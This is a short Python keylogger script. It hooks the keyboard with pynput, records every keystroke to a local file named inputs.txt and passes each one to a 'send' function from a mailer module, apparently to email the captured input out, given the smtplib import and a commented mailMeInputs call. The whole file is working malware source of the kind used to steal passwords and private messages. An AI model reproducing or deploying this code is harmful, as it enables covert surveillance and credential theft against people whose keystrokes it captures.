import pynput
from pynput.keyboard import Listener, Key
from mailer import send

import smtplib, ssl

keys = []

def onPress(key):
    keys.append(key)
    write_file(keys)

    try:
        print(key.char)

    except AttributeError:
        print(key)

def write_file(keys):
    with open("inputs.txt", "w") as f:
        for key in keys:
            key1 = str(key).replace("'", "")
            key2 = str(key1).replace("Key", "\n Key")
            f.write(key2)
            send(key2)

            # mailMeInputs()
  
def on_release(key):
    
    # print('{0} released'. format(key))
    if key == Key.esc :
        return False;

with Listener(on_press = onPress, on_release = on_release) as listener:
    listener.join()